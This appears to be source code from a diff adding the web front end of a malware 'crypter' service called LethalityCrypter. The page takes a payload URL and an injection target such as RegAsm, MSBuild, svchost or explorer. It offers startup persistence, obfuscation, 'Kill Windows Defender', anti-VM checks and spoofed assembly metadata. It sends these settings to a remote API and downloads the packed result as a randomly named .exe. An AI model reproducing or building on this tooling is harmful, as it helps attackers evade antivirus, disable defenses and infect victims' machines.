@@ -1,0 +1,276 @@
+﻿@page "/crypter"
+@inject HttpClient client;
+@inject LethalityCrypter.Client.Providers.ICookie cookie
+@inject IJSRuntime JS
+
+<div class="container-fluid">
+    <div class="page-title-box">
+        <h4 class="page-title">Crypter</h4>
+        <hr />
+    </div><!--end page-title-box-->
+    <div class="row">
+        <div class="col-lg-6">
+            <div class="card" style="height: 300px;">
+                <div class="card-header">
+                    <h4 class="card-title">File</h4>
+                </div><!--end card-header-->
+                <div class="card-body">
+                    <div class="container">
+                        <div class="mb-3 row">
+                            <input class="form-control form-control-lg" id="fileUrl" type="text" placeholder="Type url of your file" @oninput="@((e) => { url = (string)e.Value; })" />
+                            <h4 class="card-title mt-3" style="margin-left: -5px;">Injection</h4>
+                            <select class="form-select mt-3" aria-label="Default select example" @onchange="((e) => { injectionPath = (string)e.Value; })">
+                                <option>Select</option>
+                                <option value="C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe">RegAsm [DOTNET]</option>
+                                <option value="C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe">MSBuild [DOTNET]</option>
+                                <option value="C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe">vbc [DOTNET]</option>
+                                <option value="C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe">RegSvcs [DOTNET]</option>
+                                <option value="C:\Windows\Microsoft.NET\Framework\v4.0.30319\CasPol.exe">CasPol [DOTNET]</option>
+                                <option value="caspol">-</option>
+                                <option value="C:\Windows\System32\svchost.exe">svchost [NATIVE]</option>
+                                <option value="C:\Windows\System32\schtasks.exe">schtasks [NATIVE]</option>
+                                <option value="C:\Windows\explorer.exe">explorer [NATIVE]</option>
+                                <option value="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe">powershell [NATIVE]</option>
+                            </select>
+                        </div>
+                    </div>
+                </div><!--end card-body-->
+            </div><!--end card-->
+        </div> <!-- end col -->
+
+        <div class="col-lg-6">
+            <div class="card" style="height: 300px;">
+                <div class="card-header">
+                    <h4 class="card-title">Settings</h4>
+                </div><!--end card-header-->
+                <div class="card-body">
+
+                    <div class="col-lg-6">
+                        <div class="container">
+
+                            <div class="mb-3 row">
+                                <div class="form-check form-check-inline">
+                                    <input class="form-check-input" type="checkbox" id="inlineCheckbox3" value="status2" @oninput="@((e) => { startup = (bool)e.Value; })">
+                                    <label class="form-check-label" for="inlineCheckbox1">Startup</label>
+                                </div>
+                            </div>
+
+                            <div class="mb-3 row">
+                                <div class="form-check form-check-inline">
+                                    <input class="form-check-input" type="checkbox" id="inlineCheckbox3" value="status2" @oninput="@((e) => { obfuscator = (bool)e.Value; })">
+                                    <label class="form-check-label" for="inlineCheckbox1">Obfuscator</label>
+                                </div>
+                            </div>
+
+                            <div class="mb-3 row">
+                                <div class="form-check form-check-inline">
+                                    <input class="form-check-input" type="checkbox" id="inlineCheckbox3" value="status2" @oninput="@((e) => { killWindowsDefender = (bool)e.Value; })">
+                                    <label class="form-check-label" for="inlineCheckbox1">Kill Windows Defender</label>
+                                </div>
+                            </div>
+
+                            <div class="mb-3 row">
+                                <div class="form-check form-check-inline">
+                                    <input class="form-check-input" type="checkbox" id="inlineCheckbox3" value="status2" @oninput="@((e) => { antiVM = (bool)e.Value; })">
+                                    <label class="form-check-label" for="inlineCheckbox1">Anti Virtual Machine</label>
+                                </div>
+                            </div>
+
+                        </div>
+
+                        <div class="mb-3 row" style="margin-right: 50px;">
+                            <div class="col-sm-10">
+                                <input class="form-control" type="number" value="" id="delay" placeholder="Delay (second)" @onchange="@((e) => { delay = (string)e.Value; })">
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-6">
+            <div class="card" style="height: 370px;">
+                <div class="card-header">
+                    <h4 class="card-title">Message Box</h4>
+                </div><!--end card-header-->
+                <div class="card-body">
+                    <div class="container">
+                        <div class="mb-3 row">
+                            <div class="form-check form-check-inline">
+                                <input class="form-check-input" type="checkbox" id="messageBoxEnabled" value="status2" @oninput="@((e) => { messageBox = (bool)e.Value; })">
+                                <label class="form-check-label">Enabled</label>
+                            </div>
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="title" placeholder="Title" @oninput="@((e) => { messageBoxTitle = (string)e.Value; })">
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="body" placeholder="Body" @oninput="@((e) => { messageBoxBody = (string)e.Value; })">
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-6">
+            <div class="card" style="height: 370px;">
+                <div class="card-header">
+                    <h4 class="card-title">Assembly Changer</h4>
+                </div><!--end card-header-->
+                <div class="card-body">
+                    <div class="container">
+                        <div class="mb-3 row">
+                            <div class="form-check form-check-inline">
+                                <input class="form-check-input" type="checkbox" id="messageBoxEnabled" value="status2" @oninput="@((e) => { assemblyChanger = (bool)e.Value; })">
+                                <label class="form-check-label">Enabled</label>
+                            </div>
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="" placeholder="Assembly Title" @oninput="@((e) => { assemblyTitle = (string)e.Value; })">
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="body" placeholder="Description" @oninput="@((e) => { assemblyBody = (string)e.Value; })">
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="body" placeholder="Company" @oninput="@((e) => { assemblyCompany = (string)e.Value; })">
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="body" placeholder="Product" @oninput="@((e) => { assemblyProduct = (string)e.Value; })">
+                        </div>
+
+                        <div class="mb-3 row">
+                            <input type="text" class="form-control" id="body" placeholder="Copyright" @oninput="@((e) => { assemblyCopyright = (string)e.Value; })">
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="col-sm-12">
+            <div class="row">
+                <div class="col-12">
+                    <div class="card">
+                        <div class="card-body">
+                            <div class="row">
+                                <div class="col-lg-12">
+                                    <form>
+
+                                        <div class="row">
+
+                                            <h4 class="card-title mb-2">Crypt Server</h4>
+                                            <div class="row mb-3">
+
+                                                <div class="col-md-9">
+                                                    <div class="form-check form-check-inline">
+                                                        <input class="form-check-input" type="checkbox" id="inlineCheckbox2" value="status1" @oninput="((e) => { privateb = (bool)e.Value; })" />
+                                                        <label class="form-check-label" for="inlineCheckbox1">Private Stub</label>
+                                                    </div>
+                                                </div>
+                                            </div><!--end row-->
+                                        </div>
+                                        <button name="iniciar" id="iniciar" value="Iniciar" type="button" class="btn btn-primary btn-sm" @onclick="Crypt">Crypt!</button>
+                                    </form>  <!--end form-->
+                                </div><!--end col-->
+
+                            </div><!--end row-->
+                        </div><!--end card-body-->
+
+                    </div><!--end card-->
+                </div><!--end col-->
+            </div><!--end row-->
+
+        </div><!--end col-->
+
+    </div><!-- container -->
+</div>
+
+@code {
+    string url = "";
+    string injectionPath = "";
+    bool startup = false;
+    bool obfuscator = false;
+    bool privateb = false;
+    bool killWindowsDefender = false;
+    bool antiVM = false;
+    string delay = "";
+    bool messageBox = false;
+    string messageBoxTitle = "";
+    string messageBoxBody = "";
+    bool assemblyChanger = false;
+    string assemblyTitle = "";
+    string assemblyBody = "";
+    string assemblyCompany = "";
+    string assemblyProduct = "";
+    string assemblyCopyright = "";
+
+    private async Task Crypt()
+    {
+        var id = await JS.InvokeAsync<string>("eval", "document.cookie");
+        id = id.Split('=')[1];
+        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        var stringChars = new char[8];
+        var random = new Random();
+
+        for (int i = 0; i < stringChars.Length; i++)
+        {
+            stringChars[i] = chars[random.Next(chars.Length)];
+        }
+
+        var finalString = new String(stringChars);
+
+        HttpRequestMessage requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://lethality.dev/api/crypter");
+
+        requestMessage.Content = JsonContent.Create(
+        new
+        {
+            Token = id,
+            InjectionPath = injectionPath,
+            FileUrl = url,
+            Startup = startup,
+            Obfuscator = obfuscator,
+            KillWindowsDefender = killWindowsDefender,
+            AntiVM = antiVM,
+            Private = privateb,
+            Delay = Convert.ToInt32(delay),
+            MessageBox = messageBox,
+            MessageBoxTitle = messageBoxTitle,
+            MessageBoxBody = messageBoxBody,
+            AssemblyChanger = assemblyChanger,
+            AssemblyTitle = assemblyTitle,
+            AssemblyBody = assemblyBody,
+            AssemblyCompany = assemblyCompany,
+            AssemblyProduct = assemblyProduct,
+            AssemblyCopyright = assemblyCopyright
+        });
+
+        var response = await client.SendAsync(requestMessage);
+        var responseString = await response.Content.ReadAsStringAsync();
+
+        if (IsBase64String(responseString))
+        {
+            string fileName = $"{finalString}.exe";
+            string contentType = "application/octet-stream";
+
+            await JS.InvokeVoidAsync("BlazorDownloadFile", fileName, contentType, responseString);
+        }
+        else
+        {
+            await JS.InvokeVoidAsync("alert", responseString);
+        }
+    }
+
+    public static bool IsBase64String(string base64)
+    {
+        Span<byte> buffer = new Span<byte>(new byte[base64.Length]);
+        return Convert.TryFromBase64String(base64, buffer, out int bytesParsed);
+    }
+}
